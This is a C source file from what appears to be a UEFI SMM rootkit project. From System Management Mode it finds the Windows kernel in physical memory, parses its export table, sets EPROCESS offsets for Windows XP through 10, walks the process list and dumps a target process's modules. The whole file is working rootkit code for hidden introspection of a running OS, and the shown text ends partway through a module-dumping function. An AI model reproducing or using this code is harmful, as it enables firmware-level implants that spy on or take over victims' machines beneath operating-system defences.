#include "WinTools.h"

#ifndef HEADER_SIZE
#define HEADER_SIZE 0x1000
#endif

WinCtx *winGlobal = NULL;

// from SMMRootkit.c
extern EFI_SMM_SYSTEM_TABLE2 *gSmst2;

/*
  The low stub (if exists), contains PML4 (kernel DirBase) and KernelEntry point.
  Credits: PCILeech
*/
STATIC BOOLEAN CheckLow(UINT64 *pml4, UINT64 *kernelEntry)
{
  UINT64 o = 0;
  while (o < 0x100000)
  {
    o += 0x1000;

    // Check if address is okay
    if (IsAddressValid(o) == TRUE)
    {
      if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64 *)(VOID *)(o + 0x000)))
      {
        continue;
      } // START
      if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64 *)(VOID *)(o + 0x070)))
      {
        continue;
      } // KERNEL
      if (0xffffff0000000fff & *(UINT64 *)(VOID *)(o + 0x0a0))
      {
        continue;
      } // PML4
      *pml4 = *(UINT64 *)(VOID *)(o + 0xa0);
      *kernelEntry = *(UINT64 *)(VOID *)(o + 0x70);

      return TRUE;
    }
  }
  return FALSE;
}

STATIC BOOLEAN findNtosKrnl(UINT64 kernelEntry, UINT64 PML4, UINT64 *ntKernel)
{
  // Check nulled kernelEntry
  SerialPrintStringDebug("  Trying to find Ntos kernel ... \r\n");

  UINT64 physicalFirst = 0;
  physicalFirst = VTOP(kernelEntry & 0xFFFFFFFFFF000000, PML4, FALSE);

  if (IsAddressValid(physicalFirst) == TRUE && physicalFirst != 0)
  {
    if (((kernelEntry & 0xFFFFFFFFFF000000) & 0xfffff) == 0 && *(INT16 *)(VOID *)(physicalFirst) == IMAGE_DOS_SIGNATURE)
    {
      INT32 kdbg = 0, poolCode = 0;
      for (INT32 u = 0; u < 0x1000; u++)
      {
        kdbg = kdbg || *(UINT64 *)(VOID *)(physicalFirst + u) == 0x4742444b54494e49;
        poolCode = poolCode || *(UINT64 *)(VOID *)(physicalFirst + u) == 0x45444f434c4f4f50;
        if (kdbg & poolCode)
        {
          *ntKernel = kernelEntry & 0xFFFFFFFFFF000000;
          SerialPrintStringDebug("  Kernel found!\r\n");
          return TRUE;
        }
      }
    }
  }

  // Check kernelEntry + 0x2000000
  UINT64 physicalSec = 0;
  physicalSec = VTOP((kernelEntry & 0xFFFFFFFFFF000000) + 0x2000000, PML4, FALSE);

  if (IsAddressValid(physicalSec) == TRUE && physicalSec != 0)
  {
    if ((((kernelEntry & 0xFFFFFFFFFF000000) + 0x2000000) & 0xfffff) == 0 && *(INT16 *)(VOID *)(physicalSec) == IMAGE_DOS_SIGNATURE)
    {
      INT32 kdbg = 0, poolCode = 0;
      for (INT32 u = 0; u < 0x1000; u++)
      {
        kdbg = kdbg || *(UINT64 *)(VOID *)(physicalSec + u) == 0x4742444b54494e49;
        poolCode = poolCode || *(UINT64 *)(VOID *)(physicalSec + u) == 0x45444f434c4f4f50;
        if (kdbg & poolCode)
        {
          *ntKernel = (kernelEntry & 0xFFFFFFFFFF000000) + 0x2000000;
          SerialPrintStringDebug("  Kernel found!\r\n");
          return TRUE;
        }
      }
    }
  }

  UINT64 i, p, u, mask = 0xfffff;

  while (mask >= 0xfff)
  {
    for (i = (kernelEntry & ~0x1fffff) + 0x10000000; i > kernelEntry - 0x20000000; i -= 0x200000)
    {
      for (p = 0; p < 0x200000; p += 0x1000)
      {

        UINT64 physicalP = 0;
        physicalP = VTOP(i + p, PML4, FALSE);

        if (IsAddressValid(physicalP) == TRUE && physicalP != 0)
        {
          if (((i + p) & mask) == 0 && *(INT16 *)(VOID *)(physicalP) == IMAGE_DOS_SIGNATURE)
          {
            INT32 kdbg = 0, poolCode = 0;
            for (u = 0; u < 0x1000; u++)
            {
              if (IsAddressValid(p + u) == FALSE)
                continue;

              kdbg = kdbg || *(UINT64 *)(VOID *)(physicalP + u) == 0x4742444b54494e49;
              poolCode = poolCode || *(UINT64 *)(VOID *)(physicalP + u) == 0x45444f434c4f4f50;
              if (kdbg & poolCode)
              {
                *ntKernel = i + p;
                SerialPrintStringDebug("  Kernel found!\r\n");
                return TRUE;
              }
            }
          }
        }
      }
    }

    mask = mask >> 4;
  }
  SerialPrintString("ERROR: Could not find NTOS Kernel!\r\n");
  return FALSE;
}

VOID FreeExportList(WinExportList list)
{
  if (!list.list)
    return;

  for (UINT32 i = 0; i < list.size; i++)
    free((CHAR8 *)list.list[i].name);

  free(list.list);
  list.list = NULL;
}

UINT64 GetProcAddress(const WinCtx *ctx, const WinProc *process, UINT64 module, const CHAR8 *procName)
{
  WinExportList exports;

  if (!GenerateExportList(ctx, process, module, &exports))
    return 0;

  UINT64 ret = FindProcAddress(exports, procName);
  FreeExportList(exports);
  return ret;
}

UINT64 FindProcAddress(const WinExportList exports, const CHAR8 *procName)
{
  for (UINT32 i = 0; i < exports.size; i++)
    if (!strcmp(procName, exports.list[i].name))
      return exports.list[i].address;
  return 0;
}

STATIC UINT16 GetNTVersion(const WinCtx *ctx)
{
  UINT64 getVersion = FindProcAddress(ctx->ntExports, "RtlGetVersion");

  if (!getVersion)
  {
    SerialPrintString("ERROR: Failed finding RtlGetVersion \r\n");
    return 0;
  }

  CHAR8 buf[0x100];

  v_memRead((UINT64)buf, getVersion, 0x100, ctx->initialProcess.dirBase, FALSE);

  CHAR8 major = 0, minor = 0;

  /* Find writes to rcx +4 and +8 -- those are our major and minor versions */
  for (CHAR8 *b = buf; b - buf < 0xf0; b++)
  {
    if (!major && !minor)
      if (*(UINT32 *)(VOID *)b == 0x441c748)
        return ((UINT16)b[4]) * 100 + (b[5] & 0xf);
    if (!major && (*(UINT32 *)(VOID *)b & 0xfffff) == 0x441c7)
      major = b[3];
    if (!minor && (*(UINT32 *)(VOID *)b & 0xfffff) == 0x841c7)
      minor = b[3];
  }

  if (minor >= 100)
    minor = 0;

  return ((UINT16)major) * 100 + minor;
}

STATIC UINT32 GetNTBuild(const WinCtx *ctx)
{
  UINT64 getVersion = FindProcAddress(ctx->ntExports, "RtlGetVersion");

  if (!getVersion)
  {
    SerialPrintString("ERROR: Failed finding RtlGetVersion \r\n");
    return 0;
  }

  UINT8 buf[0x100];
  v_memRead((UINT64)buf, getVersion, 0x100, ctx->initialProcess.dirBase, FALSE);

  /* Find writes to rcx +12 -- that's where the version number is stored. These instructions are not on XP, but that is simply irrelevant. */
  for (UINT8 *b = buf; b - buf < 0xf0; b++)
  {
    UINT32 val = *(UINT32 *)(VOID *)b & 0xffffff;
    if (val == 0x0c41c7 || val == 0x05c01b)
      return *(UINT32 *)(VOID *)(b + 3);
  }

  /* Build 19044 onwards:
   *
   * If we can't find the rcx + 12, find what was moved to EAX with offset of RIP,
   * In bytecode this translates to 0f b7 05 ef be ad de 
   *    (movzx  eax,WORD PTR [rip+offset] , offset deadbeef)
   * 
   * Later on in v_memRead a static offset of 7 is used because the movzx instruction 
   * takes 7 bytes in total, and RIP is pointing to the *next* instruction.
   */
  for (UINT8 *b = buf; b - buf < 0xf0; b++)
  {
    UINT32 val = *(UINT32 *)(VOID *)b & 0xffffff;
    /*
     * From 19044 onwards there are many movzx  eax,WORD PTR
     * instructions, for now the Build is the first being pushed
     */
    if (val == 0x05b70f)
    {
      UINT32 offset = *(UINT32 *)(VOID *)(b + 3);
      UINT16 build = 0;
      v_memRead((UINT64)&build, getVersion + (b - buf) + 7 + offset, sizeof(build), ctx->initialProcess.dirBase, FALSE);
      
      /*
       * For some reason the kernel first tries to offer 19041 as the build number here, 
       * but after a couple of retries the build number is magically patched to 
       * 19044. Gotta love Microsoft :-)
       */
      if(build > 19041)
        return (UINT32)build;

      return 0;
    }
  }

  return 0;
}

STATIC BOOLEAN SetupOffsets(WinCtx *ctx)
{
  switch (ctx->ntVersion)
  {
  case 502: /* XP SP2 */
    ctx->offsets = (WinOffsets){
        .apl = 0xe0,
        .session = 0x260,
        .imageFileName = 0x268,
        .dirBase = 0x28,
        .peb = 0x2c0,
        .peb32 = 0x30,
        .threadListHead = 0x290,
        .threadListEntry = 0x3d0,
        .teb = 0xb0};
    break;
  case 601: /* W7 */
    ctx->offsets = (WinOffsets){
        .apl = 0x188,
        .session = 0x2d8,
        .imageFileName = 0x2e0,
        .dirBase = 0x28,
        .peb = 0x338,
        .peb32 = 0x30,
        .threadListHead = 0x300,
        .threadListEntry = 0x420, /* 0x428 on later SP1 */
        .teb = 0xb8};
    /* SP1 */
    if (ctx->ntBuild == 7601)
      ctx->offsets.imageFileName = 0x2d8;
    break;
  case 602: /* W8 */
    ctx->offsets = (WinOffsets){
        .apl = 0x2e8,
        .session = 0x430,
        .imageFileName = 0x438,
        .dirBase = 0x28,
        .peb = 0x338, /*peb will be wrong on Windows 8 and 8.1*/
        .peb32 = 0x30,
        .threadListHead = 0x470,
        .threadListEntry = 0x400,
        .teb = 0xf0};
    break;
  case 603: /* W8.1 */
    ctx->offsets = (WinOffsets){
        .apl = 0x2e8,
        .session = 0x430,
        .imageFileName = 0x438,
        .dirBase = 0x28,
        .peb = 0x338,
        .peb32 = 0x30,
        .threadListHead = 0x470,
        .threadListEntry = 0x688, /* 0x650 on previous builds */
        .teb = 0xf0};
    break;
  case 1000: /* W10 */
    ctx->offsets = (WinOffsets){
        .apl = 0x2e8,
        .session = 0x448,
        .imageFileName = 0x450,
        .dirBase = 0x28,
        .peb = 0x3f8,
        .peb32 = 0x30,
        .threadListHead = 0x488,
        .threadListEntry = 0x6a8,
        .teb = 0xf0};

    if (ctx->ntBuild >= 18362)
    { /* Version 1903 or higher */
      ctx->offsets.apl = 0x2f0;
      ctx->offsets.threadListEntry = 0x6b8;
    }
      
    if (ctx->ntBuild >= 19041)
    {
      ctx->offsets.apl = 0x448;
      ctx->offsets.session = 0x558;
      ctx->offsets.imageFileName = 0x5a8;
      ctx->offsets.peb = 0x550;
      ctx->offsets.threadListHead = 0x5e0;
      ctx->offsets.threadListEntry = 0x4e8; //probably wrong, but it's not used anywhere
    }

    break;
  default:
    return FALSE;
  }
  return TRUE;
}

BOOLEAN InitGlobalWindowsContext()
{
  SerialPrintStringDebug("== Initializing windows context struct ==\r\n");

  if (winGlobal)
  {
    SerialPrintStringDebug("  Cleaning up old Windows struct ...\r\n");
    FreeExportList(winGlobal->ntExports);
  }

  SerialPrintStringDebug("  Dynamic memory allocated before WinCtx init: ");
  SerialPrintNumberDebug(GetMemAllocated(), 10);
  SerialPrintStringDebug("\r\n");

  BOOLEAN status = TRUE;
  BOOLEAN verbose = FALSE;

  // Search for the PML4 and kernelEntry
  UINT64 PML4, kernelEntry;
  status = CheckLow(&PML4, &kernelEntry);

  if (status == TRUE)
  {
    SerialPrintStringDebug("  PML4: 0x");
    SerialPrintNumberDebug(PML4, 16);
    SerialPrintStringDebug(" Kernel entrypoint: 0x");
    SerialPrintNumberDebug(kernelEntry, 16);
    SerialPrintStringDebug("\r\n");

    winGlobal->initialProcess.dirBase = PML4;
  }
  else
  {
    SerialPrintString("KernelEntry failed! \r\n");

    return FALSE;
  }

  // Search ntoskrnl
  status = findNtosKrnl(kernelEntry, PML4, &winGlobal->ntKernel);

  if (status == TRUE)
  {
    SerialPrintStringDebug("  NT kernel: 0x");
    SerialPrintNumberDebug(winGlobal->ntKernel, 16);
    SerialPrintStringDebug("\r\n");
  }
  else
  {
    SerialPrintStringDebug("ERROR: Failed finding NT kernel!\r\n");
    return FALSE;
  }

  SerialPrintStringDebug("  Parsing Windows kernel exports ...\r\n");
  if (GenerateExportList(winGlobal, &winGlobal->initialProcess, winGlobal->ntKernel, &winGlobal->ntExports) == FALSE)
  {
    return FALSE;
  }

  UINT64 PsInitialSystemProcess = FindProcAddress(winGlobal->ntExports, "PsInitialSystemProcess");

  if (status == TRUE)
  {
    SerialPrintStringDebug("  PsInitialSystemProcess: 0x");
    SerialPrintNumberDebug(PsInitialSystemProcess, 16);
    SerialPrintStringDebug("\r\n");
  }
  else
  {
    SerialPrintString("ERROR: Failed finding PsInitialSystemProcess\r\n");
    return FALSE;
  }

  // Find System EPROCESS
  UINT64 systemProcess = 0;
  v_memRead((UINT64)&systemProcess, PsInitialSystemProcess, sizeof(UINT64), PML4, verbose);

  if (status == TRUE)
  {
    SerialPrintStringDebug("  SystemProcess: 0x");
    SerialPrintNumberDebug(systemProcess, 16);
    SerialPrintStringDebug("\r\n");
  }
  else
  {
    SerialPrintString("ERROR: Failed finding SystemProcess\r\n");
    return FALSE;
  }

  winGlobal->initialProcess.process = systemProcess;
  winGlobal->initialProcess.physProcess = VTOP(systemProcess, PML4, verbose);

  // Get Kernel Version & Build
  winGlobal->ntVersion = GetNTVersion(winGlobal);

  if (winGlobal->ntVersion == 0)
  {
    SerialPrintString("ERROR: Failed finding NT version\r\n");
    return FALSE;
  }

  SerialPrintStringDebug("  NtVer: ");
  SerialPrintNumberDebug(winGlobal->ntVersion, 10);
  SerialPrintStringDebug("\r\n");

  winGlobal->ntBuild = GetNTBuild(winGlobal);

  if (winGlobal->ntBuild == 0)
  {
    SerialPrintString("ERROR: Failed finding NT build!\r\n");
    return FALSE;
  }

  SerialPrintStringDebug("  NtBuild ");
  SerialPrintNumberDebug(winGlobal->ntBuild, 10);
  SerialPrintStringDebug("\r\n");

  status = SetupOffsets(winGlobal);

  if (status == FALSE)
  {
    SerialPrintString("ERROR: Failed setting Windows offsets!\r\n");
    return FALSE;
  }

  SerialPrintStringDebug("== Windows offsets set! ==\r\n\r\n");
  return TRUE;
}

BOOLEAN ParseExportTable(const WinCtx *ctx, const WinProc *process, UINT64 moduleBase, IMAGE_DATA_DIRECTORY *exports, WinExportList *outList)
{
  BOOLEAN verbose = FALSE;

  if (exports->Size < sizeof(IMAGE_EXPORT_DIRECTORY) || exports->Size > 0x7fffff || exports->VirtualAddress == moduleBase)
    return FALSE;

  UINT64 realSize = exports->Size & 0xFFFFFFFFFFFFF000;
  realSize = realSize + 0x1000;

  EFI_PHYSICAL_ADDRESS physAddr;
  CHAR8 *buf;
  EFI_STATUS ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, (realSize / 0x1000), &physAddr);

  if (ret != EFI_SUCCESS)
  {
    SerialPrintString("  Failed allocating pages while parsing export table! \r\n");
    return FALSE;
  }

  buf = (CHAR8 *)physAddr;

  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)(VOID *)buf;

  for (INT32 i = 0; i < (realSize / 0x1000); i++)
  {
    // Read page by page into buffer
    UINT64 physicalP = 0;
    physicalP = VTOP(moduleBase + exports->VirtualAddress + (i * 0x1000), process->dirBase, verbose);

    if (IsAddressValid(physicalP) == TRUE && physicalP != 0)
    {
      // Valid address, read it now
      if (p_memCpy((UINT64)(buf + (i * 0x1000)) & 0xFFFFFFFFFFFFF000, physicalP & 0xFFFFFFFFFFFFF000, 0x1000, verbose) == FALSE)
        SerialPrintString("  Failed physread! \r\n");
    }
    else
    {
      SerialPrintString("  Invalid Address! \r\n");
    }
  }

  SerialPrintStringDebug("  Finished Export Table.. NameAmount ");
  SerialPrintNumberDebug(exportDir->NumberOfNames, 10);
  SerialPrintStringDebug("\r\n");

  buf[exports->Size] = 0;
  if (!exportDir->NumberOfNames || !exportDir->AddressOfNames)
  {
    SerialPrintString("  Export Table invalid! NON is 0 \r\n");
    gSmst2->SmmFreePages(physAddr, (realSize / 0x1000));
    return FALSE;
  }

  UINT32 exportOffset = exports->VirtualAddress;
  UINT32 *names = (UINT32 *)(VOID *)(buf + exportDir->AddressOfNames - exportOffset);

  // THIS FAILS FOR KERNEL32.DLL
  // TODO: FIX IT!
  if (exportDir->AddressOfNames - exportOffset + exportDir->NumberOfNames * sizeof(UINT32) > exports->Size)
  {
    gSmst2->SmmFreePages(physAddr, (realSize / 0x1000));
    return FALSE;
  }
  UINT16 *ordinals = (UINT16 *)(VOID *)(buf + exportDir->AddressOfNameOrdinals - exportOffset);
  if (exportDir->AddressOfNameOrdinals - exportOffset + exportDir->NumberOfNames * sizeof(UINT16) > exports->Size)
  {
    gSmst2->SmmFreePages(physAddr, (realSize / 0x1000));
    return FALSE;
  }
  UINT32 *functions = (UINT32 *)(VOID *)(buf + exportDir->AddressOfFunctions - exportOffset);
  if (exportDir->AddressOfFunctions - exportOffset + exportDir->NumberOfFunctions * sizeof(UINT32) > exports->Size)
  {
    gSmst2->SmmFreePages(physAddr, (realSize / 0x1000));
    return FALSE;
  }

  SerialPrintStringDebug("  Dynamically allocating table ...\r\n");
  outList->size = exportDir->NumberOfNames;
  outList->list = (WinExport *)malloc(sizeof(WinExport) * outList->size);

  if (!outList->list)
  {
    SerialPrintString("ERROR: Allocating memory for the NtKernel export list failed! alloc size was ");
    SerialPrintNumber(outList->size, 10);
    SerialPrintString("\r\n");
    gSmst2->SmmFreePages(physAddr, (realSize / 0x1000));
    return FALSE;
  }

  size_t sz = 0;

  SerialPrintStringDebug("  Filling the export list ...\r\n");
  for (UINT32 i = 0; i < exportDir->NumberOfNames; i++)
  {
    if (names[i] > exports->Size + exportOffset || names[i] < exportOffset || ordinals[i] > exportDir->NumberOfNames)
      continue;
    outList->list[sz].name = strdup(buf + names[i] - exportOffset);
    outList->list[sz].address = moduleBase + functions[ordinals[i]];
    sz++;
  }

  outList->size = sz;
  gSmst2->SmmFreePages(physAddr, (realSize / 0x1000));

  SerialPrintStringDebug("  Export list successfully filled!\r\n");

  return TRUE;
}

BOOLEAN GenerateExportList(const WinCtx *ctx, const WinProc *process, UINT64 moduleBase, WinExportList *outList)
{
  UINT8 is64 = 0;
  UINT8 headerBuf[HEADER_SIZE];

  IMAGE_NT_HEADERS64 *ntHeader64 = GetNTHeader(ctx, process, moduleBase, headerBuf, &is64);

  if (!ntHeader64)
    return FALSE;

  IMAGE_NT_HEADERS32 *ntHeader32 = (IMAGE_NT_HEADERS32 *)ntHeader64;

  IMAGE_DATA_DIRECTORY *exportTable = NULL;
  if (is64)
  {
    SerialPrintStringDebug("  Parsing export table for 64-bit module ...\r\n");
    exportTable = ntHeader64->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;
  }
  else
  {
    SerialPrintStringDebug("  Parsing export table for 32-bit module ...\r\n");
    exportTable = ntHeader32->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;
  }
  return ParseExportTable(ctx, process, moduleBase, exportTable, outList);
}

IMAGE_NT_HEADERS *GetNTHeader(const WinCtx *ctx, const WinProc *process, UINT64 address, UINT8 *header, UINT8 *is64Bit)
{
  v_memRead((UINT64)header, address, HEADER_SIZE, process->dirBase, FALSE);

  //TODO: Allow the compiler to properly handle alignment
  IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)(VOID *)header;
  if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    return NULL;

  IMAGE_NT_HEADERS *ntHeader = (IMAGE_NT_HEADERS *)(VOID *)(header + dosHeader->e_lfanew);
  if ((UINT8 *)ntHeader - header > HEADER_SIZE - 0x200 || ntHeader->Signature != IMAGE_NT_SIGNATURE)
    return NULL;

  if (ntHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC && ntHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    return NULL;

  *is64Bit = ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;

  return ntHeader;
}

BOOLEAN FindProcess(WinCtx *ctx, CHAR8 *processname, BOOLEAN verbose)
{
  UINT64 curProc = ctx->initialProcess.physProcess;
  UINT64 virtProcess = ctx->initialProcess.process;

  if (verbose)
  {
    SerialPrintStringDebug("  curProc: ");
    SerialPrintNumberDebug(curProc, 16);
    SerialPrintStringDebug(" virtProcess ");
    SerialPrintNumberDebug(virtProcess, 16);
    SerialPrintStringDebug("\r\n");
  }

  BOOLEAN foundSystemProcess = FALSE;

  UINT32 size = 0;
  while (!size || curProc != ctx->initialProcess.physProcess)
  {
    UINT64 *session = 0;
    if (IsAddressValid(curProc + ctx->offsets.session) == TRUE)
    {
      session = (UINT64 *)(curProc + ctx->offsets.session);

      if (verbose)
      {
        SerialPrintString("  Session: ");
        SerialPrintNumber(*session, 16);
        SerialPrintString(" at ");
        SerialPrintNumber(curProc + ctx->offsets.session, 16);
        SerialPrintString("\r\n");
      }
    }

    UINT64 *dirBase = 0;
    if (IsAddressValid(curProc + ctx->offsets.dirBase) == TRUE)
    {
      dirBase = (UINT64 *)(curProc + ctx->offsets.dirBase);

      if (verbose)
      {
        SerialPrintString("  dirBase: ");
        SerialPrintNumber(*dirBase, 16);
        SerialPrintString(" at ");
        SerialPrintNumber(curProc + ctx->offsets.dirBase, 16);
        SerialPrintString("\r\n");
      }
    }

    UINT64 *pid = 0;
    if (IsAddressValid(curProc + ctx->offsets.apl - 8) == TRUE)
    {
      pid = (UINT64 *)(curProc + ctx->offsets.apl - 8);

      if (verbose)
      {
        SerialPrintString("  pid: ");
        SerialPrintNumber(*pid, 16);
        SerialPrintString(" at ");
        SerialPrintNumber(curProc + ctx->offsets.apl - 8, 16);
        SerialPrintString("\r\n");
      }
    }

    if (*session || *pid == 4)
    {
      size++;
      CHAR8 *name;

      if (IsAddressValid(curProc + ctx->offsets.imageFileName) == TRUE)
      {
        name = (CHAR8 *)(curProc + ctx->offsets.imageFileName);

        if (!strcmp(name, "System"))
        {
          foundSystemProcess = TRUE;
        }

        // Check if it's the process requested
        if (!strcmp(name, processname))
        {
          return TRUE;
        }
      }
    }

    // get the next process
    UINT64 *tempVirt;
    if (IsAddressValid(curProc + ctx->offsets.apl) == TRUE)
    {
      tempVirt = (UINT64 *)(curProc + ctx->offsets.apl);

      virtProcess = *tempVirt;
    }
    else
    {
      virtProcess = 0;
    }

    virtProcess = virtProcess - ctx->offsets.apl;

    if (verbose)
    {
      SerialPrintString("  virtProcess: ");
      SerialPrintNumber(virtProcess, 16);
      SerialPrintString("\r\n");
    }

    if (!virtProcess)
      break;

    curProc = VTOP(virtProcess, *dirBase, verbose);

    if (verbose)
    {
      SerialPrintString("  curProc: ");
      SerialPrintNumber(curProc, 16);
      SerialPrintString("\r\n");
    }

    if (!curProc)
      break;
  }

  // If the windows struct is trashed during bootup or smth,
  // re-init the windows structs
  if (!foundSystemProcess)
    InitGlobalWindowsContext();

  return FALSE;
}

BOOLEAN DumpSingleProcess(WinCtx *ctx, CHAR8 *processname, WinProc *process, BOOLEAN verbose)
{
  UINT64 curProc = ctx->initialProcess.physProcess;
  UINT64 virtProcess = ctx->initialProcess.process;

  if (verbose)
  {
    SerialPrintString("  curProc: ");
    SerialPrintNumber(curProc, 16);
    SerialPrintString(" virtProcess ");
    SerialPrintNumber(virtProcess, 16);
    SerialPrintString("\r\n");
  }

  UINT32 size = 0;

  while (!size || curProc != ctx->initialProcess.physProcess)
  {
    UINT64 *session = 0;
    if (IsAddressValid(curProc + ctx->offsets.session) == TRUE)
    {
      session = (UINT64 *)(curProc + ctx->offsets.session);

      if (verbose)
      {
        SerialPrintString("  Session: ");
        SerialPrintNumber(*session, 16);
        SerialPrintString(" at ");
        SerialPrintNumber(curProc + ctx->offsets.session, 16);
        SerialPrintString("\r\n");
      }
    }

    UINT64 *dirBase = 0;
    if (IsAddressValid(curProc + ctx->offsets.dirBase) == TRUE)
    {
      dirBase = (UINT64 *)(curProc + ctx->offsets.dirBase);

      if (verbose)
      {
        SerialPrintString("  dirBase: ");
        SerialPrintNumber(*dirBase, 16);
        SerialPrintString(" at ");
        SerialPrintNumber(curProc + ctx->offsets.dirBase, 16);
        SerialPrintString("\r\n");
      }
    }

    UINT64 *pid = 0;
    if (IsAddressValid(curProc + ctx->offsets.apl - 8) == TRUE)
    {
      pid = (UINT64 *)(curProc + ctx->offsets.apl - 8);

      if (verbose)
      {
        SerialPrintString("  pid: ");
        SerialPrintNumber(*pid, 16);
        SerialPrintString(" at ");
        SerialPrintNumber(curProc + ctx->offsets.apl - 8, 16);
        SerialPrintString("\r\n");
      }
    }

    if (*session || *pid == 4)
    {
      size++;
      CHAR8 *name;

      if (IsAddressValid(curProc + ctx->offsets.imageFileName) == TRUE)
      {
        name = (CHAR8 *)(curProc + ctx->offsets.imageFileName);

        // Check if it's the process requested
        if (!strcmp(name, processname))
        {
          process->dirBase = *dirBase;
          process->process = virtProcess;
          process->physProcess = curProc;
          process->pid = *pid;
          return TRUE;
        }
      }
    }

    UINT64 *tempVirt;
    if (IsAddressValid(curProc + ctx->offsets.apl) == TRUE)
    {
      tempVirt = (UINT64 *)(curProc + ctx->offsets.apl);

      virtProcess = *tempVirt;
    }
    else
    {
      virtProcess = 0;
    }

    virtProcess = virtProcess - ctx->offsets.apl;

    if (verbose)
    {
      SerialPrintString("  virtProcess: ");
      SerialPrintNumber(virtProcess, 16);
      SerialPrintString("\r\n");
    }

    if (!virtProcess)
      break;

    curProc = VTOP(virtProcess, *dirBase, verbose);

    if (verbose)
    {
      SerialPrintString("  curProc: ");
      SerialPrintNumber(curProc, 16);
      SerialPrintString("\r\n");
    }

    if (!curProc)
      break;
  }

  return FALSE;
}

STATIC BOOLEAN DumpSingleModule64(const WinCtx *ctx, const WinProc *process, WinModule *out_module, BOOLEAN *x86, BOOLEAN verbose)
{
  if (process->dirBase == 0 || process->physProcess == 0 || process->process == 0)
  {
    SerialPrintString("ERROR: Process not setup correctly for module dumping!\r\n");
    return FALSE;
  }

  PEB peb = GetPeb(ctx, process);

  if (peb.Ldr == 0)
  {
    SerialPrintString("ERROR: Failed reading PEB64 for module dumping!\r\n");
    return FALSE;
  }

  PEB_LDR_DATA *ldr;

  UINT64 physLdr = VTOP(peb.Ldr, process->dirBase, FALSE);

  if (IsAddressValid(physLdr) == FALSE)
  {
    SerialPrintString("ERROR: Phys Ldr is invalid while dumping module!\r\n");
    return FALSE;
  }

  ldr = (PEB_LDR_DATA *)physLdr;
  UINT64 head = ldr->InMemoryOrderModuleList.f_link;

  UINT64 end = head;
  UINT64 prev = head + 1;

  BOOLEAN module_found = FALSE;

  do
  {
    prev = head;

    UINT8 modBuffer[sizeof(LDR_MODULE)];
    LDR_MODULE *mod = (LDR_MODULE *)modBuffer;

    v_memRead((UINT64)mod, head - sizeof(LIST_ENTRY_WIN), sizeof(LDR_MODULE), process->dirBase, FALSE);
    v_memRead((UINT64)&head, head, sizeof(head), process->dirBase, FALSE);

    if (!mod->BaseDllName.length || !mod->SizeOfImage)
    {
      continue;
    }

    if (mod->BaseDllName.buffer == 0)
    {
      continue;
    }

    UINT8 oldBuffer[0x28];
    v_memRead((UINT64)oldBuffer, mod->BaseDllName.buffer, 0x28, process->dirBase, FALSE);

    CHAR8 newBuffer[0x15];
    for (INT32 i = 0; i < 0x14; i++)
      newBuffer[i] = ((CHAR8 *)oldBuffer)[i * 2];
    newBuffer[0x15 - 1] = '\0';

    if (*(INT16 *)(VOID *)newBuffer == 0x53)
    {
      SerialPrintStringDebug("  WARNING: Name buffer error while dumping module! \r\n");
      continue;
    }

    if (!stricmp(out_module->name, newBuffer))
    {
      out_module->baseAddress = mod->BaseAddress;
      out_module->sizeOfModule = mod->SizeOfImage;
      out_module->entryPoint = mod->EntryPoint;
      out_module->loadCount = mod->LoadCount;
      module_found = TRUE;
    }

    // bail out if the process is 64-bit,
    // find the module with the 32-bit func
    if (!strcmp("wow64.dll", newBuffer))
    {
      *x86 = TRUE;
      return FALSE;
    }
  } while (head != end && head != prev);

  if (!module_found)
  {
    SerialPrintString("ERROR: Could not find module ");
    SerialPrintString(out_module->name);
    SerialPrintString("\r\n");
  }

  return module_found;
}

STATIC BOOLEAN DumpSingleModule86(const WinCtx *ctx, const WinProc *process, WinModule *out_module, BOOLEAN verbose)
{
  if (process->dirBase == 0 || process->physProcess == 0 || process->process == 0)
  {
    SerialPrintString("ERROR: Process not setup correctly \r\n");
    return FALSE;
  }

  UINT64 dirBase = process->dirBase;

  // Get PEB32 of Process
  PEB32 peb = GetPeb32(ctx, process);

  if (peb.Ldr == 0)
  {
    SerialPrintString("Failed reading PEB32 \r\n");
    return FALSE;
  }

  PEB_LDR_DATA32 *ldr;

  UINT64 physLdr = VTOP(peb.Ldr, dirBase, FALSE);

  if (IsAddressValid(physLdr) == FALSE)
  {
    SerialPrintString("ERROR: Phys Ldr is invalid \r\n");
    return FALSE;
  }

  SerialPrintStringDebug("  Phys Ldr at: ");
  SerialPrintNumberDebug(physLdr, 16);
  SerialPrintStringDebug("\r\n");

  ldr = (PEB_LDR_DATA32 *)physLdr;

  SerialPrintStringDebug("  Head Flink: ");
  SerialPrintNumberDebug(ldr->InMemoryOrderModuleList.f_link, 16);
  SerialPrintStringDebug("\r\n");

  UINT32 head = ldr->InMemoryOrderModuleList.f_link;

  UINT32 end = head;

  UINT32 prev = head + 1;

  do
  {
    prev = head;

    UINT8 modBuffer[sizeof(LDR_MODULE32)];
    LDR_MODULE32 *mod = (LDR_MODULE32 *)modBuffer;

    v_memRead((UINT64)mod, head - sizeof(LIST_ENTRY_32_WIN), sizeof(LDR_MODULE32), dirBase, verbose);
    v_memRead((UINT64)&head, head, sizeof(head), dirBase, verbose);

    if (!mod->BaseDllName.length || !mod->SizeOfImage)
    {
      SerialPrintStringDebug("INB1\r\n");
      continue;
    }

    if (mod->BaseDllName.buffer == 0)
    {
      SerialPrintStringDebug("INB2\r\n");
      continue;
    }

    UINT8 oldBuffer[0x28];
    v_memRead((UINT64)oldBuffer, mod->BaseDllName.buffer, 0x28, dirBase, verbose);

    CHAR8 newBuffer[0x15];
    for (INT32 i = 0; i < 0x14; i++)
      newBuffer[i] = ((CHAR8 *)oldBuffer)[i * 2];
    newBuffer[0x15 - 1] = '\0';

    SerialPrintStringDebug("MN ");
    for (INT32 i = 0; i < 0x15; i++)
    {
      // what the fuck?
      // SerialPrintString(newBuffer[i]);
    }
